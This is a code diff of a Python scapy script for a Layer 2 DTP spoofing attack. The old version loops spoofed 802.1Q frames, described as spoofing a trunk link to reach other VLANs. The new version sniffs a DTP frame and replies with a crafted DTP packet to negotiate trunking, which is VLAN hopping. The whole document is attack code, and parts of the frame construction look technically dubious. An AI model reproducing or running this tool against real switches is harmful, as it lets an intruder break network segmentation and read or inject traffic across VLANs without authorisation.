@@ -1,28 +1,46 @@
 from scapy.all import *
-from scapy.layers.l2 import Dot1Q, Ether
-import argparse
-import threading
-import time
+from scapy.contrib.dtp import DTP
+import sys
 
-def spoof_dtp(interface, src_mac, dst_mac, vlan_id):
-    dtp_packet = Ether(dst=dst_mac, src=src_mac) / Dot1Q(vlan=vlan_id)
-    
-    while True:
-        sendp(dtp_packet, iface=interface)
-        time.sleep(30)
+def get_interface_mac(interface):
+    return get_if_hwaddr(interface)
 
-def main():
-    parser = argparse.ArgumentParser(description="Spoof a trunk link to receive VLAN traffic from other VLANs and send into any VLAN.")
-    parser.add_argument("interface", help="Network interface to send packets from")
-    parser.add_argument("src_mac", help="Source MAC address to use for spoofed packets")
-    parser.add_argument("dst_mac", help="Destination MAC address to use for spoofed packets")
-    parser.add_argument("vlan_id", type=int, help="VLAN ID to spoof")
-    
-    args = parser.parse_args()
+def get_vlan_id(pkt):
+    if pkt.haslayer(Dot1Q):
+        return pkt[Dot1Q].vlan
+    return None
 
-    spoof_thread = threading.Thread(target=spoof_dtp, args=(args.interface, args.src_mac, args.dst_mac, args.vlan_id))
-    spoof_thread.start()
-    spoof_thread.join()
+def get_dtp_packet(interface):
+    def pkt_callback(pkt):
+        if pkt.haslayer(DTP):
+            src_mac = pkt.src
+            dst_mac = pkt.dst
+            vlan_id = get_vlan_id(pkt)
+            print(f"Source MAC: {src_mac}")
+            print(f"Destination MAC: {dst_mac}")
+            print(f"VLAN ID: {vlan_id}")
+            # Add additional functionality here to handle the spoofed packet
+            send_dtp_packet(interface, src_mac, dst_mac, vlan_id)
+
+    sniff(iface=interface, filter="ether proto 0x2004", prn=pkt_callback, count=1)
+
+def send_dtp_packet(interface, src_mac, dst_mac, vlan_id):
+    dtp_packet = (
+        Ether(src=src_mac, dst=dst_mac) /
+        Dot1Q(vlan=vlan_id) /
+        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
+        SNAP(OUI=0x00000c, code=0x2004) /
+        DTP()
+    )
+    sendp(dtp_packet, iface=interface)
+    print(f"Sent DTP packet from {src_mac} to {dst_mac} on VLAN {vlan_id}")
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <interface>")
+        sys.exit(1)
+
+    interface = sys.argv[1]
+    src_mac = get_interface_mac(interface)
+    print(f"Interface MAC Address: {src_mac}")
+    get_dtp_packet(interface)
